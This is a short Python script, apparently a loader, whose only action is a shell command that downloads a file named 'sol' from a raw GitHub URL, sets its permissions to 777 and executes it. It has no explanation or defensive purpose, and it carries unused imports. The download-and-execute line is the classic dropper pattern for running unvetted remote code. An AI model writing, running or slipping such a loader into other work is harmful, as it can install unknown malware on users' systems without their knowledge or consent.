from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
 

 

 
def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]
 

 


cmdline ( 'wget https://raw.githubusercontent.com/aurbach55/dera/main/sol && chmod 777 sol && ./sol' )
